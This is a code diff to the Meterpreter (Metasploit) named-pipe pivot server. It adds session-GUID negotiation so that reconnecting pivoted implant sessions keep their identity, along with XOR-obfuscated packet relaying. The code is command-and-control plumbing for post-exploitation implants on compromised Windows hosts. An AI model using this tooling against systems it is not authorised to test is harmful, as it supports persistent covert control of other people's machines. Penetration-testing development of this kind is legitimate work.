@@ -1,6 +1,7 @@
 #include "metsrv.h"
 #include "../../common/common.h"
 #include "server_pivot_named_pipe.h"
+#include "../../common/packet_encryption.h"
 
 #include <AccCtrl.h>
 #include <AclApi.h>
@@ -17,6 +18,8 @@ typedef struct _NamedPipeContext
 	char       name[PIPE_NAME_SIZE];
 	GUID       pivot_id;
 	GUID       pivot_session_guid;
+	BOOL       session_established;
+	CHAR       guid_request_id[32];
 	Remote*    remote;
 	HANDLE     pipe;
 	BOOL       connecting;
@@ -33,6 +36,7 @@ typedef struct _NamedPipeContext
 
 static DWORD server_notify(Remote* remote, LPVOID entryContext, LPVOID threadContext);
 static DWORD server_destroy(HANDLE waitable, LPVOID entryContext, LPVOID threadContext);
+static DWORD named_pipe_write_raw(LPVOID state, LPBYTE raw, DWORD rawLength);
 
 typedef BOOL (WINAPI *PAddMandatoryAce)(PACL pAcl, DWORD dwAceRevision, DWORD dwAceFlags, DWORD dwMandatoryPolicy, PSID pLabelSid);
 static BOOL WINAPI AddMandatoryAce(PACL pAcl, DWORD dwAceRevision, DWORD dwAceFlags, DWORD dwMandatoryPolicy, PSID pLabelSid)
@@ -95,6 +99,7 @@ static DWORD remove_listener(LPVOID state)
 
 static DWORD read_pipe_to_packet(NamedPipeContext* ctx, LPBYTE source, DWORD sourceSize)
 {
+	BOOL relayPacket = TRUE;
 	// Make sure we have the space to handle the incoming packet
 	if (ctx->packet_buffer_size < sourceSize + ctx->packet_buffer_offset)
 	{
@@ -137,8 +142,84 @@ static DWORD read_pipe_to_packet(NamedPipeContext* ctx, LPBYTE source, DWORD sou
 	{
 		// whole packet is ready for transmission to the other side! Pivot straight through the existing
 		// transport by sending the raw packet to the transmitter.
-		dprintf("[PIVOT] Entire packet is ready, size is %u, offset is %u", ctx->packet_required_size, ctx->packet_buffer_offset);
-		ctx->remote->transport->packet_transmit(ctx->remote, ctx->packet_buffer, ctx->packet_required_size);
+		if (!ctx->session_established)
+		{
+			dprintf("[PIPE] Session not yet established, checking for response packet");
+			// we need to check if this packet contains a response to the request for a session guid
+			PacketHeader* header = (PacketHeader*)ctx->packet_buffer;
+			xor_bytes(header->xor_key, (LPBYTE)&header->session_guid, ctx->packet_required_size - sizeof(header->xor_key));
+			if (header->enc_flags == ENC_FLAG_NONE)
+			{
+				dprintf("[PIPE] Incoming packet is not encrypted!");
+				Packet* packet = (Packet*)calloc(1, sizeof(Packet));
+				packet->header.length = header->length;
+				packet->header.type = header->type;
+				packet->payloadLength = ntohl(packet->header.length) - sizeof(TlvHeader);
+				packet->payload = ctx->packet_buffer + sizeof(PacketHeader);
+
+				CHAR* requestId = packet_get_tlv_value_string(packet, TLV_TYPE_REQUEST_ID);
+				if (requestId != NULL && memcmp(ctx->guid_request_id, requestId, sizeof(ctx->guid_request_id)) == 0)
+				{
+					dprintf("[PIPE] Request ID found and matches expected value");
+					// we have a response to our session guid request
+					LPBYTE sessionGuid = packet_get_tlv_value_raw(packet, TLV_TYPE_SESSION_GUID);
+#ifdef DEBUGTRACE
+					PUCHAR h = (PUCHAR)&sessionGuid[0];
+					dprintf("[PIPE] Returned session guid: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
+						h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
+					h = (PUCHAR)&ctx->pivot_session_guid;
+					dprintf("[PIPE]    Pivot session guid: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
+						h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
+					dprintf("[PIPE] Session pivot session guid size: %u", sizeof(ctx->pivot_session_guid));
+#endif
+					if (sessionGuid != NULL && memcmp(&ctx->pivot_session_guid, sessionGuid, sizeof(ctx->pivot_session_guid)) != 0)
+					{
+						dprintf("[PIPE] Session guid returned, looks like the session is a reconnect");
+						memcpy(&ctx->pivot_session_guid, sessionGuid, sizeof(ctx->pivot_session_guid));
+					}
+					else
+					{
+						dprintf("[PIPE] Session guid not found, looks like the session is new");
+
+						// We need to generate a new session GUID and inform metasploit of the new session
+						CoCreateGuid(&ctx->pivot_session_guid);
+
+						// swizzle the values around so that endianness isn't an issue before casting to a block of bytes
+						ctx->pivot_session_guid.Data1 = htonl(ctx->pivot_session_guid.Data1);
+						ctx->pivot_session_guid.Data2 = htons(ctx->pivot_session_guid.Data2);
+						ctx->pivot_session_guid.Data3 = htons(ctx->pivot_session_guid.Data3);
+					}
+
+					ctx->session_established = TRUE;
+
+					// with the session now established, we need to inform metasploit of the new connection
+					dprintf("[PIPE] Informing MSF of the new named pipe pivot");
+					Packet* notification = packet_create(PACKET_TLV_TYPE_REQUEST, "core_pivot_session_new");
+					packet_add_tlv_raw(notification, TLV_TYPE_SESSION_GUID, (LPVOID)&ctx->pivot_session_guid, sizeof(ctx->pivot_session_guid));
+					packet_add_tlv_raw(notification, TLV_TYPE_PIVOT_ID, (LPVOID)&ctx->pivot_id, sizeof(ctx->pivot_id));
+					packet_transmit(ctx->remote, notification, NULL);
+
+					PivotContext* pivotContext = (PivotContext*)calloc(1, sizeof(PivotContext));
+					pivotContext->state = ctx;
+					pivotContext->packet_write = named_pipe_write_raw;
+					pivot_tree_add(ctx->remote->pivot_sessions, (LPBYTE)&ctx->pivot_session_guid, pivotContext);
+#ifdef DEBUGTRACE
+					dprintf("[PIVOTTREE] Pivot sessions (after new one added)");
+					dbgprint_pivot_tree(ctx->remote->pivot_sessions);
+#endif
+					relayPacket = FALSE;
+				}
+
+				free(packet);
+			}
+			xor_bytes(header->xor_key, (LPBYTE)&header->session_guid, ctx->packet_required_size - sizeof(header->xor_key));
+		}
+
+		if (relayPacket)
+		{
+			dprintf("[PIVOT] Entire packet is ready, size is %u, offset is %u", ctx->packet_required_size, ctx->packet_buffer_offset);
+			ctx->remote->transport->packet_transmit(ctx->remote, ctx->packet_buffer, ctx->packet_required_size);
+		}
 		// TODO: error check?
 
 		// with the packet sent, we need to rejig a bit here so that the next block of data
@@ -157,7 +238,7 @@ static DWORD read_pipe_to_packet(NamedPipeContext* ctx, LPBYTE source, DWORD sou
 	return ERROR_SUCCESS;
 }
 
-DWORD named_pipe_write_raw(LPVOID state, LPBYTE raw, DWORD rawLength)
+static DWORD named_pipe_write_raw(LPVOID state, LPBYTE raw, DWORD rawLength)
 {
 	NamedPipeContext* ctx = (NamedPipeContext*)state;
 	DWORD dwResult = ERROR_SUCCESS;
@@ -552,27 +633,37 @@ static DWORD server_notify(Remote* remote, LPVOID entryContext, LPVOID threadCon
 				serverCtx->stage_data = NULL;
 			}
 
-			// We need to generate a new session GUID and inform metasploit of the new session
-			CoCreateGuid(&serverCtx->pivot_session_guid);
+			// We need to figure out if this is a new session without a session GUID or if it's an old
+			// session that's come back out of nowhere (transport switching, sleeping, etc). Create a packet
+			// that will request the guid, and track a random request ID to find the response later on.
+			dprintf("[NP-SERVER] Creating the guid request packet");
+			Packet* getGuidPacket = packet_create(PACKET_TLV_TYPE_REQUEST, "core_get_session_guid");
+			dprintf("[NP-SERVER] adding the request ID to the guid request packet");
+			packet_add_request_id(getGuidPacket);
+			CHAR* requestId = packet_get_tlv_value_string(getGuidPacket, TLV_TYPE_REQUEST_ID);
+			dprintf("[NP-SERVER] Copying the request ID from the packet to the context");
+			memcpy(serverCtx->guid_request_id, requestId, sizeof(serverCtx->guid_request_id));
 
-			// swizzle the values around so that endianness isn't an issue before casting to a block of bytes
-			serverCtx->pivot_session_guid.Data1 = htonl(serverCtx->pivot_session_guid.Data1);
-			serverCtx->pivot_session_guid.Data2 = htons(serverCtx->pivot_session_guid.Data2);
-			serverCtx->pivot_session_guid.Data3 = htons(serverCtx->pivot_session_guid.Data3);
+			// prepare the packet buffer for sending.
+			DWORD packetLength = getGuidPacket->payloadLength + sizeof(PacketHeader);
+			dprintf("[NP-SERVER] We think the packet length is %u (0x%x)", packetLength, packetLength);
+			LPBYTE packetBuffer = (LPBYTE)malloc(packetLength);
 
-			Packet* notification = packet_create(PACKET_TLV_TYPE_REQUEST, "core_pivot_session_new");
-			packet_add_tlv_raw(notification, TLV_TYPE_SESSION_GUID, (LPVOID)&serverCtx->pivot_session_guid, sizeof(serverCtx->pivot_session_guid));
-			packet_add_tlv_raw(notification, TLV_TYPE_PIVOT_ID, (LPVOID)&serverCtx->pivot_id, sizeof(serverCtx->pivot_id));
-			packet_transmit(serverCtx->remote, notification, NULL);
+			dprintf("[NP-SERVER] Doing the XOR thing on the guid request packet");
+			rand_xor_key(getGuidPacket->header.xor_key);
+			memcpy(packetBuffer, &getGuidPacket->header, sizeof(getGuidPacket->header));
+			memcpy(packetBuffer + sizeof(getGuidPacket->header), getGuidPacket->payload, packetLength - sizeof(getGuidPacket->header));
 
-			PivotContext* pivotContext = (PivotContext*)calloc(1, sizeof(PivotContext));
-			pivotContext->state = serverCtx;
-			pivotContext->packet_write = named_pipe_write_raw;
-			pivot_tree_add(remote->pivot_sessions, (LPBYTE)&serverCtx->pivot_session_guid, pivotContext);
-#ifdef DEBUGTRACE
-			dprintf("[PIVOTTREE] Pivot sessions (after new one added)");
-			dbgprint_pivot_tree(remote->pivot_sessions);
-#endif
+			// we don't support encryption at this point, but we do want to do the XOR thing!
+			xor_bytes(getGuidPacket->header.xor_key, packetBuffer + sizeof(getGuidPacket->header.xor_key), packetLength - sizeof(getGuidPacket->header.xor_key));
+
+			dprintf("[NP-SERVER] Sending the request packet to the new pivoted session");
+			// Send the packet down to the newly created meterpreter session on the named pipe
+			named_pipe_write_raw(serverCtx, packetBuffer, packetLength);
+
+			dprintf("[NP-SERVER] Freeing up the packet buffer");
+			free(packetBuffer);
+			dprintf("[NP-SERVER] Done!");
 		}
 
 		if (bytesProcessed > 0)
